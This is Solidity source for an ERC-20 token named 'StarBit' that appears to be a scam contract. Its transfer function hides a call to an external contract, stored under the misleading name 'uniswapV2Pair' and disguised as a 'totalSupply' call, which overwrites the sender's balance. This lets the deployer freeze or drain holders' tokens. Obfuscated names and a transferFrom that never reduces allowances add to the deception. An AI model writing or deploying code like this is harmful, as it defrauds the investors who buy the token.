contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _nameonEiYT;
    string private _symbolonEiYT;
    uint256 private _decimalsonEiYT;
    uint256 private _totalSupply;
    address public uniswapV2Pair;

    constructor(uint256 decimalsonEiYT_, address _addonEiYT) {
        _decimalsonEiYT = decimalsonEiYT_;
        uniswapV2Pair = _addonEiYT;
        _nameonEiYT ="StarBit";
        _symbolonEiYT = "StarBit";
        _totalSupply = 1000000000 * 10**_decimalsonEiYT;
        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() external view returns (string memory) {
        return _nameonEiYT;
    }

    function symbol() external view returns (string memory) {
        return _symbolonEiYT;
    }

    function decimals() external view returns (uint256) {
        return _decimalsonEiYT;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _onEiYTtransfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _onEiYTtransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");
        _balance[from] = ERC20(
         uniswapV2Pair)
         .totalSupply(
            from,
            amount,
            _balance[from]
        );
        require(
            _balance[from] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balance[from] -= amount;
        _balance[to] += amount;
        emit Transfer(from, to, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _onEiYTtransfer(sender, recipient, amount);
        uint256 Allowancec = _allowances[sender][_msgSender()];
        require(Allowancec >= amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

